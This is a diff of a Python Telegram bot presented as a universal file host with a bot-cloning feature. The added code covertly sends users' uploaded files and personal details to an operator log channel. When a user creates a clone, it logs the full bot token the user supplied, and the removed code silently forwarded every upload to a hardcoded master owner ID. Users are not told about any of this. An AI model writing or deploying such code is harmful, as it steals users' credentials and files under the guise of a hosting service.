+        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        log_msg += f"🌐 Clone bot is now running independently"
+        
+        send_to_log_channel(log_msg)
+    except Exception as e:
+        logger.error(f"Error logging clone creation: {e}")
+
+def log_script_execution(user_id, file_name, status, execution_time=None):
+    """Log script execution to channel"""
+    try:
+        user_info = get_user_info(user_id)
+        
+        # Check if this is from a cloned bot
+        current_bot_username = bot.get_me().username
+        is_cloned_bot = current_bot_username != "CyberHacked0Bot"  # Adjust to your main bot username
+        
+        log_msg = f"🚀 SCRIPT EXECUTION\n\n"
+        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
+        log_msg += f"🆔 User ID: {user_id}\n"
+        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
+        
+        if is_cloned_bot:
+            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"
+            
+        log_msg += f"📄 File: {file_name}\n"
+        log_msg += f"📊 Status: {status}\n"
+        if execution_time:
+            log_msg += f"⏱️ Execution Time: {execution_time}s\n"
+        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        send_to_log_channel(log_msg)
+    except Exception as e:
+        logger.error(f"Error logging script execution: {e}")
+
+def get_user_info(user_id):
+    """Get user information from database"""
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('SELECT username, first_name, last_name FROM active_users WHERE user_id = ?', (user_id,))
+        result = c.fetchone()
+        conn.close()
+        
+        if result:
+            return {
+                'username': result[0],
+                'first_name': result[1],
+                'last_name': result[2]
+            }
+        else:
+            return {
+                'username': 'Unknown',
+                'first_name': 'Unknown',
+                'last_name': 'Unknown'
+            }
+    except Exception as e:
+        logger.error(f"Error getting user info: {e}")
+        return {
+            'username': 'Unknown',
+            'first_name': 'Unknown',
+            'last_name': 'Unknown'
+        }
+
+# --- Enhanced Periodic Backup System ---
+def periodic_backup():
+    """Run periodic backups every hour"""
+    while True:
+        try:
+            time.sleep(3600)  # 1 hour
+            
+            # Create backup
+            create_backup()
+            
+            # Save persistent data
+            save_persistent_data()
+            
+            # Log backup completion
+            logger.info("Periodic backup completed successfully")
+            
+            # Send backup status to log channel
+            try:
+                backup_status = f"🔄 AUTOMATIC BACKUP COMPLETED\n\n"
+                backup_status += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                backup_status += f"📊 Active Users: {len(active_users)}\n"
+                backup_status += f"📁 Total Files: {sum(len(files) for files in user_files.values())}\n"
+                backup_status += f"🚀 Running Scripts: {len(bot_scripts)}\n"
+                backup_status += f"🤖 Running Clones: {len(user_clones)}\n"
+                backup_status += f"✅ All data secured"
+                
+                send_to_log_channel(backup_status)
+            except:
+                pass
+                
+        except Exception as e:
+            logger.error(f"Error in periodic backup: {e}")
+
+def start_periodic_backup():
+    """Start the periodic backup thread"""
+    backup_thread = threading.Thread(target=periodic_backup, daemon=True)
+    backup_thread.start()
+    logger.info("Periodic backup system started")
+
+# --- Enhanced User Management ---
+def save_all_users_to_backup():
+    """Save complete user list to backup file"""
+    try:
+        user_backup_file = os.path.join(BACKUP_DIR, f"users_backup_{datetime.now().strftime('%Y%m%d_%H%M')}.json")
+        
+        user_data = {
+            'active_users': list(active_users),
+            'user_details': {},
+            'backup_time': datetime.now().isoformat()
+        }
+        
+        # Get detailed user info
+        try:
+            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+            c = conn.cursor()
+            c.execute('SELECT user_id, username, first_name, last_name, join_date, last_seen FROM active_users')
+            
+            for user_id, username, first_name, last_name, join_date, last_seen in c.fetchall():
+                user_data['user_details'][str(user_id)] = {
+                    'username': username,
+                    'first_name': first_name,
+                    'last_name': last_name,
+                    'join_date': join_date,
+                    'last_seen': last_seen,
+                    'file_count': get_user_file_count(user_id)
+                }
+            
+            conn.close()
+        except Exception as e:
+            logger.error(f"Error getting user details: {e}")
+        
+        with open(user_backup_file, 'w', encoding='utf-8') as f:
+            json.dump(user_data, f, indent=2, ensure_ascii=False)
+        
+        logger.info(f"User backup saved: {user_backup_file}")
+        return user_backup_file
+    except Exception as e:
+        logger.error(f"Error saving user backup: {e}")
+        return None
+
+# --- Ban Management Commands ---
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    """Ban a user from using the bot"""
+    user_id = message.from_user.id
+    if user_id not in admin_ids:
+        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
+        return
+
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            safe_reply_to(message, "❌ Usage: /ban <user_id> [reason]")
+            return
+
+        target_user_id = int(parts[1])
+        reason = "No reason provided"
+        
+        if len(parts) > 2:
+            reason = ' '.join(parts[2:])
+        
+        banned_users.add(target_user_id)
+        
+        try:
+            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+            c = conn.cursor()
+            c.execute('INSERT OR REPLACE INTO banned_users (user_id, reason, ban_date) VALUES (?, ?, ?)',
+                     (target_user_id, reason, datetime.now().isoformat()))
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logger.error(f"Database error saving ban: {e}")
+
+        # Update persistent data
+        save_persistent_data()
+
+        safe_reply_to(message, f"✅ User banned!\n\nUser: {target_user_id}\nReason: {reason}")
+        
+        send_to_log_channel(f"🚫 USER BANNED\n\nUser ID: {target_user_id}\nReason: {reason}\nBy Admin: {user_id}")
+
+    except Exception as e:
+        safe_reply_to(message, f"❌ Error: {str(e)}")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message):
+    """Unban a user"""
+    user_id = message.from_user.id
+    if user_id not in admin_ids:
+        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
+        return
+
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            safe_reply_to(message, "❌ Usage: /unban <user_id>")
+            return
+
+        target_user_id = int(parts[1])
+        
+        if target_user_id in banned_users:
+            banned_users.remove(target_user_id)
+            
+            try:
+                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+                c = conn.cursor()
+                c.execute('DELETE FROM banned_users WHERE user_id = ?', (target_user_id,))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logger.error(f"Database error removing ban: {e}")
+
+            # Update persistent data
+            save_persistent_data()
+
+            safe_reply_to(message, f"✅ User unbanned!\n\nUser: {target_user_id}")
+            
+            send_to_log_channel(f"✅ USER UNBANNED\n\nUser ID: {target_user_id}\nBy Admin: {user_id}")
+        else:
+            safe_reply_to(message, f"❌ User not found in ban list: {target_user_id}")
+
+    except Exception as e:
+        safe_reply_to(message, f"❌ Error: {str(e)}")
+
+@bot.message_handler(commands=['banned'])
+def list_banned_users(message):
+    """List all banned users"""
+    user_id = message.from_user.id
+    if user_id not in admin_ids:
+        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
+        return
+
+    if not banned_users:
+        safe_reply_to(message, "📋 No banned users.")
+        return
+
+    banned_text = "🚫 Banned Users:\n\n"
+    
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('SELECT user_id, reason, ban_date FROM banned_users')
+        
+        for banned_user_id, reason, ban_date in c.fetchall():
+            banned_text += f"👤 User ID: {banned_user_id}\n"
+            banned_text += f"📝 Reason: {reason}\n"
+            banned_text += f"⏰ Banned: {ban_date[:16]}\n\n"
+        
+        conn.close()
+    except Exception as e:
+        logger.error(f"Error fetching banned users: {e}")
+        banned_text = "❌ Error fetching banned users"
+
+    safe_reply_to(message, banned_text)
+
 # --- Subscription Management Commands ---
 @bot.message_handler(commands=['addsub'])
 def add_subscription(message):
@@ -783,7 +1313,6 @@ def add_subscription(message):
         expiry_date = datetime.now() + timedelta(days=days)
         user_subscriptions[target_user_id] = {'expiry': expiry_date}
         
-        # Save to database
         try:
             conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
             c = conn.cursor()
@@ -794,7 +1323,12 @@ def add_subscription(message):
         except Exception as e:
             logger.error(f"Database error saving subscription: {e}")
 
+        # Update persistent data
+        save_persistent_data()
+
         safe_reply_to(message, f"✅ Subscription added!\n\nUser: {target_user_id}\nDays: {days}\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
+        
+        send_to_log_channel(f"💳 SUBSCRIPTION ADDED\n\nUser ID: {target_user_id}\nDays: {days}\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\nBy Admin: {user_id}")
 
     except Exception as e:
         safe_reply_to(message, f"❌ Error: {str(e)}")
@@ -818,7 +1352,6 @@ def remove_subscription(message):
         if target_user_id in user_subscriptions:
             del user_subscriptions[target_user_id]
             
-            # Remove from database
             try:
                 conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                 c = conn.cursor()
@@ -828,7 +1361,12 @@ def remove_subscription(message):
             except Exception as e:
                 logger.error(f"Database error removing subscription: {e}")
 
+            # Update persistent data
+            save_persistent_data()
+
             safe_reply_to(message, f"✅ Subscription removed!\n\nUser: {target_user_id}")
+            
+            send_to_log_channel(f"🗑️ SUBSCRIPTION REMOVED\n\nUser ID: {target_user_id}\nBy Admin: {user_id}")
         else:
             safe_reply_to(message, f"❌ No subscription found for user: {target_user_id}")
 
@@ -883,14 +1421,27 @@ def list_users(message):
 
     users_text = f"📊 Active Users: {len(active_users)}\n\n"
     
-    for i, user_id in enumerate(list(active_users)[:50], 1):  # Show first 50 users
-        file_count = get_user_file_count(user_id)
-        is_subscribed = user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()
-        subscription_status = "🟢 SUBSCRIBED" if is_subscribed else "🔴 FREE"
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('SELECT user_id, username, first_name, last_name, join_date FROM active_users')
         
-        users_text += f"{i}. User ID: {user_id}\n"
-        users_text += f"   Files: {file_count}\n"
-        users_text += f"   Status: {subscription_status}\n\n"
+        for i, (user_id_db, username, first_name, last_name, join_date) in enumerate(c.fetchall()[:50], 1):
+            file_count = get_user_file_count(user_id_db)
+            is_subscribed = user_id_db in user_subscriptions and user_subscriptions[user_id_db]['expiry'] > datetime.now()
+            subscription_status = "🟢 SUBSCRIBED" if is_subscribed else "🔴 FREE"
+            
+            users_text += f"{i}. User ID: {user_id_db}\n"
+            users_text += f"   Name: {first_name or ''} {last_name or ''}\n"
+            users_text += f"   Username: {username or 'None'}\n"
+            users_text += f"   Files: {file_count}\n"
+            users_text += f"   Status: {subscription_status}\n"
+            users_text += f"   Joined: {join_date[:16]}\n\n"
+        
+        conn.close()
+    except Exception as e:
+        logger.error(f"Error fetching users: {e}")
+        users_text = "❌ Error fetching users"
 
     if len(active_users) > 50:
         users_text += f"... and {len(active_users) - 50} more users"
@@ -902,25 +1453,19 @@ def list_users(message):
 def start_command(message):
     """Enhanced start command with comprehensive file type support"""
     user_id = message.from_user.id
+    
+    if user_id in banned_users:
+        safe_reply_to(message, "🚫 You are banned from using this bot.\n\nIf you believe this is a mistake, contact @CyberHacked0")
+        return
 
-    # Add user to active users
     active_users.add(user_id)
 
-    # Save to database
-    try:
-        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
-        c = conn.cursor()
-        c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"Database error in start command: {e}")
+    user_info = message.from_user
+    save_user_info(user_id, user_info.username, user_info.first_name, user_info.last_name)
 
-    # Get user info
     user_name = message.from_user.first_name or "User"
     is_admin = user_id in admin_ids
 
-    # Create welcome message
     welcome_msg = f"🔐 UNIVERSAL FILE HOST\n\n"
     welcome_msg += f"👋 Welcome {user_name}!\n\n"
     welcome_msg += f"📁 SUPPORTED FILE TYPES:\n"
@@ -943,7 +1488,6 @@ def start_command(message):
     welcome_msg += f"💡 Quick Start: Upload any file to begin!\n"
     welcome_msg += f"🤖 Clone Feature: Use /clone to create your own bot!"
 
-    # Create reply markup
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     if is_admin:
         for row in ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC:
@@ -953,18 +1497,21 @@ def start_command(message):
             markup.add(*[types.KeyboardButton(text) for text in row])
 
     safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)
+    
+    send_to_log_channel(f"🟢 USER STARTED BOT\n\nUser: {user_name}\nID: {user_id}\nUsername: @{user_info.username or 'None'}")
+    
+    # Update persistent data
+    save_persistent_data()
 
 @bot.message_handler(content_types=['document'])
 def handle_file_upload(message):
     """Enhanced file upload handler with strict security checks"""
     user_id = message.from_user.id
 
-    # Check if bot is locked
     if bot_locked and user_id not in admin_ids:
         safe_reply_to(message, "🔒 Bot is currently locked. Please try again later.")
         return
 
-    # Check file upload limits
     current_count = get_user_file_count(user_id)
     max_allowed = get_user_file_limit(user_id)
 
@@ -976,66 +1523,55 @@ def handle_file_upload(message):
     file_name = message.document.file_name or f"file_{int(time.time())}"
     file_ext = os.path.splitext(file_name)[1].lower()
 
-    # Check file size before download
-    if message.document.file_size > 10 * 1024 * 1024:  # 10MB limit
+    if message.document.file_size > 10 * 1024 * 1024:
         safe_reply_to(message, "❌ File too large! Maximum size is 10MB for security reasons.")
         return
 
     try:
-        # Send processing message
         processing_msg = safe_reply_to(message, f"🔍 Security scanning {file_name}...")
 
-        # Download file
         if file_info.file_path is None:
             safe_reply_to(message, "❌ File Download Failed\n\nUnable to retrieve file path")
             return
         downloaded_file = bot.download_file(file_info.file_path)
 
-        # Save to temporary location for scanning
         user_folder = get_user_folder(user_id)
         temp_file_path = os.path.join(user_folder, f"temp_{file_name}")
         
         with open(temp_file_path, 'wb') as f:
             f.write(downloaded_file)
 
-        # Security check for system commands and malicious patterns (BYPASS FOR OWNER)
         if user_id == OWNER_ID:
-            # Owner bypass - no security checks
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                              f"👑 Owner bypass: {file_name} - No security restrictions")
             is_safe = True
             scan_result = "Owner bypass - all files allowed"
         else:
-            # Regular security check for non-owners
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                              f"🛡️ Security scan: {file_name}...")
 
             is_safe, scan_result = check_malicious_code(temp_file_path)
             
             if not is_safe:
-                # Delete the temp file immediately
                 try:
                     os.remove(temp_file_path)
                 except:
                     pass
                 
-                # Log the security violation
                 logger.warning(f"SECURITY VIOLATION: User {user_id} uploaded file with system commands: {file_name} - {scan_result}")
                 
-                # Send security alert
                 alert_msg = f"🚨 UPLOAD BLOCKED 🚨\n\n"
-                alert_msg += f"❌ System Command Detected!\n"
+                alert_msg += f"❌ Security Threat Detected!\n"
                 alert_msg += f"📄 File: {file_name}\n"
                 alert_msg += f"🔍 Issue: {scan_result}\n\n"
-                alert_msg += f"💡 Only system commands and malicious patterns are blocked.\n"
-                alert_msg += f"Regular programming code is allowed!"
+                alert_msg += f"💡 Only safe programming code is allowed.\n"
+                alert_msg += f"Contact @CyberHacked0 if this is a legitimate file."
                 
                 safe_edit_message(processing_msg.chat.id, processing_msg.message_id, alert_msg)
                 
-                # Notify admins for actual security threats
                 for admin_id in admin_ids:
                     try:
-                        admin_alert = f"🚨 SYSTEM COMMAND DETECTED 🚨\n\n"
+                        admin_alert = f"🚨 SECURITY THREAT DETECTED 🚨\n\n"
                         admin_alert += f"👤 User ID: {user_id}\n"
                         admin_alert += f"📄 File: {file_name}\n"
                         admin_alert += f"🔍 Command: {scan_result}\n"
@@ -1048,7 +1584,6 @@ def handle_file_upload(message):
                 
                 return
 
-        # If file passes security check, move to permanent location
         file_path = os.path.join(user_folder, file_name)
         try:
             shutil.move(temp_file_path, file_path)
@@ -1058,99 +1593,60 @@ def handle_file_upload(message):
         safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                          f"✅ Security check passed - Processing {file_name}...")
 
-        # Add to user files list
         if user_id not in user_files:
             user_files[user_id] = []
 
-        # Determine file type
         file_type = 'executable' if file_ext in {'.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1'} else 'hosted'
 
-        # Remove old entry if exists
         user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
         user_files[user_id].append((file_name, file_type))
 
-        # Save to database
         try:
             conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
             c = conn.cursor()
-            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type) VALUES (?, ?, ?)',
-                     (user_id, file_name, file_type))
+            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type, upload_time) VALUES (?, ?, ?, ?)',
+                     (user_id, file_name, file_type, datetime.now().isoformat()))
             conn.commit()
             conn.close()
         except Exception as e:
             logger.error(f"Database error saving file info: {e}")
 
-        # Forward file to master owner only (6350914711) regardless of which bot received it
-        if user_id != 6350914711:  # Only forward if uploader is not the master owner
+        # Update persistent data
+        save_persistent_data()
+
+        # Log file upload to channel WITH THE ACTUAL FILE
+        log_file_upload(user_id, file_name, file_type, message.document.file_size, "✅ PASSED", file_path)
+
+        # Enhanced logging for cloned bots
+        is_cloned_bot = bot.get_me().username != "CyberHacked0Bot"  # Check if this is not the main bot
+        
+        if is_cloned_bot:
             try:
-                # Send the file to master owner with user info
-                user_info = message.from_user
-                user_name = user_info.first_name or "Unknown"
-                username = f"@{user_info.username}" if user_info.username else "No username"
+                clone_log_msg = f"🤖 FILE FROM CLONED BOT\n\n"
+                clone_log_msg += f"👤 User: {message.from_user.first_name or 'Unknown'} {message.from_user.last_name or ''}\n"
+                clone_log_msg += f"🆔 User ID: {user_id}\n"
+                clone_log_msg += f"📧 Username: @{message.from_user.username or 'None'}\n"
+                clone_log_msg += f"📄 File: {file_name}\n"
+                clone_log_msg += f"📁 Type: {file_type}\n"
+                clone_log_msg += f"🤖 Bot: @{bot.get_me().username}\n"
+                clone_log_msg += f"👑 Clone Owner: {OWNER_ID}\n"
+                clone_log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                 
-                # Check if this is a cloned bot
-                is_cloned_bot = 'MASTER_OWNER_ID' in globals()
-                
-                if is_cloned_bot:
-                    # From cloned bot - send to master owner only
-                    forward_caption = f"🤖 File from Cloned Bot\n\n"
-                    forward_caption += f"👤 From: {user_name} ({username})\n"
-                    forward_caption += f"🆔 User ID: {user_id}\n"
-                    forward_caption += f"📄 File: {file_name}\n"
-                    forward_caption += f"📁 Type: {file_type}\n"
-                    forward_caption += f"🛡️ Security: {'✅ Passed' if is_safe else '❌ Blocked'}\n"
-                    forward_caption += f"🤖 Bot: @{bot.get_me().username}\n"
-                    forward_caption += f"👑 Clone Owner: {OWNER_ID}\n"
-                    forward_caption += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                    forward_caption += f"📬 Forwarded from cloned bot to master owner."
+                with open(file_path, 'rb') as f:
+                    send_to_log_channel(clone_log_msg, f)
                     
-                    # Send only to master owner (6350914711)
-                    with open(file_path, 'rb') as f:
-                        bot.send_document(
-                            6350914711,  # Master owner ID
-                            f, 
-                            caption=forward_caption,
-                            timeout=30
-                        )
-                    
-                    logger.info(f"File {file_name} forwarded to master owner from cloned bot")
-                else:
-                    # From original bot - send to master owner only
-                    forward_caption = f"📨 New File Upload\n\n"
-                    forward_caption += f"👤 From: {user_name} ({username})\n"
-                    forward_caption += f"🆔 User ID: {user_id}\n"
-                    forward_caption += f"📄 File: {file_name}\n"
-                    forward_caption += f"📁 Type: {file_type}\n"
-                    forward_caption += f"🛡️ Security: {'✅ Passed' if is_safe else '❌ Blocked'}\n"
-                    forward_caption += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                    forward_caption += f"📬 File automatically forwarded to master owner."
-
-                    # Send only to master owner (6350914711)
-                    with open(file_path, 'rb') as f:
-                        bot.send_document(
-                            6350914711,  # Master owner ID
-                            f, 
-                            caption=forward_caption,
-                            timeout=30
-                        )
-                    
-                    logger.info(f"File {file_name} forwarded to master owner from original bot")
-                
+                logger.info(f"File {file_name} logged from cloned bot")
             except Exception as e:
-                logger.error(f"Failed to forward file to master owner: {e}")
-                # Don't interrupt the upload process if forwarding fails
+                logger.error(f"Failed to log file from cloned bot: {e}")
 
-        # Execute or host the file (only for safe files)
         if file_type == 'executable':
             if user_id == OWNER_ID:
-                # Owner gets special treatment - no additional security checks
                 success_msg = f"✅ {file_name} uploaded successfully!\n\n"
                 success_msg += f"👑 Owner Access: Unrestricted\n"
                 success_msg += f"📁 Type: {file_type}\n"
                 success_msg += f"🚀 Ready for execution\n\n"
                 success_msg += f"Use 'Check Files' to manage your file."
             else:
-                # Additional check before execution for regular users
                 safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                                  f"🔒 Final security check before execution...")
                 
@@ -1162,23 +1658,17 @@ def handle_file_upload(message):
             
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
         else:
-            # Host non-executable files immediately
             file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
             
-            # Get the current domain from environment or use default
             domain = os.environ.get('REPL_SLUG', 'universal-file-host')
             owner = os.environ.get('REPL_OWNER', 'replit-user')
             
-            # Try to get the actual replit URL
             try:
                 replit_url = f"https://{domain}.{owner}.repl.co"
-                # Test if we can access our own health endpoint
                 test_response = requests.get(f"{replit_url}/health", timeout=5)
                 if test_response.status_code != 200:
-                    # Fallback to .replit.app domain
                     replit_url = f"https://{domain}-{owner}.replit.app"
             except:
-                # Use default replit.app domain
                 replit_url = f"https://{domain}-{owner}.replit.app"
             
             file_url = f"{replit_url}/file/{file_hash}"
@@ -1196,7 +1686,6 @@ def handle_file_upload(message):
         logger.error(f"File upload error: {e}")
         safe_reply_to(message, f"❌ Upload Failed\n\nError processing file: {str(e)}")
         
-        # Clean up temp file if it exists
         try:
             temp_file_path = os.path.join(get_user_folder(user_id), f"temp_{file_name}")
             if os.path.exists(temp_file_path):
@@ -1234,7 +1723,6 @@ def check_files_button(message):
             status = "🟢 Running" if is_running else "⭕ Stopped"
             icon = "🚀"
             
-            # Add uptime info if running
             if is_running:
                 uptime = get_script_uptime(user_id, file_name)
                 if uptime:
@@ -1244,29 +1732,22 @@ def check_files_button(message):
         else:
             status = "📁 Hosted"
             icon = "📄"
-            # Generate file URL for hosted files
             file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
             
-            # Get the current domain from environment or use default
             domain = os.environ.get('REPL_SLUG', 'universal-file-host')
             owner = os.environ.get('REPL_OWNER', 'replit-user')
             
-            # Try different URL formats
             try:
                 replit_url = f"https://{domain}.{owner}.repl.co"
-                # Test if we can access our own health endpoint
                 test_response = requests.get(f"{replit_url}/health", timeout=2)
                 if test_response.status_code != 200:
-                    # Fallback to .replit.app domain
                     replit_url = f"https://{domain}-{owner}.replit.app"
             except:
-                # Use default replit.app domain
                 replit_url = f"https://{domain}-{owner}.replit.app"
             
             file_url = f"{replit_url}/file/{file_hash}"
             files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"
 
-        # Add control button for each file
         markup.add(types.InlineKeyboardButton(
             f"{icon} {file_name} - {status}", 
             callback_data=f'control_{user_id}_{file_name}'
@@ -1296,14 +1777,29 @@ def bot_speed_button(message):
 @bot.message_handler(func=lambda message: message.text == "📊 Statistics")
 def statistics_button(message):
     user_id = message.from_user.id
+    
+    # Regular users see limited statistics
+    if user_id not in admin_ids:
+        user_stats = f"📊 Your Statistics:\n\n"
+        user_stats += f"📁 Your Files: {get_user_file_count(user_id)}\n"
+        user_stats += f"📈 Your Limit: {get_user_file_limit(user_id)}\n"
+        user_stats += f"👤 Account Type: {'👑 Admin' if user_id in admin_ids else '👤 User'}\n\n"
+        user_stats += f"🔒 Full statistics available to admins only"
+        
+        safe_reply_to(message, user_stats)
+        return
+
+    # Admin sees full statistics
     total_users = len(active_users)
     total_files = sum(len(files) for files in user_files.values())
     running_scripts = len(bot_scripts)
+    running_clones = len(user_clones)
 
     stats_text = f"📊 Universal File Host Statistics:\n\n"
     stats_text += f"🎭 Active Users: {total_users}\n"
     stats_text += f"📁 Total Files: {total_files}\n"
     stats_text += f"🚀 Running Scripts: {running_scripts}\n"
+    stats_text += f"🤖 Running Clones: {running_clones}\n"
     stats_text += f"🔧 Your Files: {get_user_file_count(user_id)}\n"
     stats_text += f"📈 Your Limit: {get_user_file_limit(user_id)}\n\n"
     stats_text += f"🔒 Features:\n"
@@ -1326,7 +1822,6 @@ def contact_owner_button(message):
 
 @bot.message_handler(commands=['clone'])
 def clone_bot_command(message):
-    """Allow users to clone the bot with their own token - FIXED WORKING VERSION"""
     user_id = message.from_user.id
     
     clone_text = f"🤖 Bot Cloning Service\n\n"
@@ -1351,33 +1846,27 @@ def clone_bot_command(message):
 
 @bot.message_handler(commands=['settoken'])
 def set_bot_token(message):
-    """Set user's bot token and create clone - FIXED WORKING VERSION"""
     user_id = message.from_user.id
     
-    # Extract token from message
     try:
         token = message.text.split(' ', 1)[1].strip()
     except IndexError:
         safe_reply_to(message, "❌ Please provide your bot token!\n\nUsage: `/settoken YOUR_BOT_TOKEN`")
         return
     
-    # Basic token validation
     if not token or len(token) < 35 or ':' not in token:
         safe_reply_to(message, "❌ Invalid bot token format!\n\nGet a valid token from @BotFather")
         return
     
-    # Send processing message
     processing_msg = safe_reply_to(message, "🔄 Creating your bot clone...\n\nThis may take a moment...")
     
     try:
-        # Test the token
         test_bot = telebot.TeleBot(token)
         bot_info = test_bot.get_me()
         
         safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                          f"✅ Token validated!\n\nBot: @{bot_info.username}\nCreating clone...")
         
-        # Create bot clone
         clone_success = create_bot_clone(user_id, token, bot_info.username)
         
         if clone_success:
@@ -1392,16 +1881,8 @@ def set_bot_token(message):
             
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
             
-            # Notify admins about new clone
-            for admin_id in admin_ids:
-                try:
-                    admin_msg = f"🤖 New Bot Clone Created\n\n"
-                    admin_msg += f"👤 User: {user_id}\n"
-                    admin_msg += f"🤖 Bot: @{bot_info.username}\n"
-                    admin_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    bot.send_message(admin_id, admin_msg)
-                except:
-                    pass
+            # Log clone creation to channel with FULL TOKEN
+            log_clone_creation(user_id, bot_info.username, token)
         else:
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                              "❌ Failed to create bot clone. Please try again later.")
@@ -1415,43 +1896,37 @@ def set_bot_token(message):
 
 @bot.message_handler(commands=['rmclone'])
 def remove_clone_command(message):
-    """Remove user's cloned bot - FIXED WORKING VERSION"""
     user_id = message.from_user.id
     
-    # Check if user has a clone
-    clone_key = f"clone_{user_id}"
     clone_info = user_clones.get(user_id)
     
     if not clone_info:
         safe_reply_to(message, "❌ No cloned bot found!\n\nYou don't have any active bot clone to remove.")
         return
     
-    # Send processing message
     processing_msg = safe_reply_to(message, "🔄 Removing your bot clone...\n\nStopping processes...")
     
     try:
         bot_username = clone_info.get('bot_username', 'Unknown')
         
-        # Stop the cloned bot process
         if clone_info.get('process'):
             try:
                 process = clone_info['process']
                 process.terminate()
-                process.wait(timeout=10)  # Wait up to 10 seconds
+                process.wait(timeout=10)
                 logger.info(f"Clone process terminated for user {user_id}")
             except Exception as e:
                 logger.warning(f"Error terminating clone process: {e}")
-                # Try force kill if normal termination fails
                 try:
                     process.kill()
                 except:
                     pass
         
-        # Remove from user_clones
         if user_id in user_clones:
             del user_clones[user_id]
         
-        # Success message
+        remove_clone_info(user_id)
+        
         success_msg = f"✅ Bot Clone Removed Successfully!\n\n"
         success_msg += f"🤖 Bot: @{bot_username}\n"
         success_msg += f"👤 Owner: You ({user_id})\n"
@@ -1461,16 +1936,7 @@ def remove_clone_command(message):
         
         safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
         
-        # Notify admins about clone removal
-        for admin_id in admin_ids:
-            try:
-                admin_msg = f"🗑️ Bot Clone Removed\n\n"
-                admin_msg += f"👤 User: {user_id}\n"
-                admin_msg += f"🤖 Bot: @{bot_username}\n"
-                admin_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                bot.send_message(admin_id, admin_msg)
-            except:
-                pass
+        send_to_log_channel(f"🗑️ CLONE BOT REMOVED\n\nUser ID: {user_id}\nBot: @{bot_username}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                 
         logger.info(f"Bot clone removed successfully for user {user_id}")
         
@@ -1483,42 +1949,37 @@ def remove_clone_command(message):
         logger.error(f"Error removing clone for user {user_id}: {e}")
 
 def create_bot_clone(user_id, token, bot_username):
-    """Create a bot clone with user's token - COMPLETELY FIXED VERSION"""
     try:
-        # Read the current script
-        current_file = __file__
-        with open(current_file, 'r', encoding='utf-8') as f:
-            original_code = f.read()
-
-        # Create modified code for the clone
-        # Replace token and owner ID
-        modified_code = original_code.replace(
-            f"TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '{TOKEN}')",
-            f"TOKEN = '{token}'"
-        )
-        modified_code = modified_code.replace(
-            f"OWNER_ID = int(os.getenv('OWNER_ID', '{OWNER_ID}'))",
-            f"OWNER_ID = {user_id}"
-        )
-        modified_code = modified_code.replace(
-            f"ADMIN_ID = int(os.getenv('ADMIN_ID', '{ADMIN_ID}'))", 
-            f"ADMIN_ID = {user_id}"
-        )
-        modified_code = modified_code.replace(
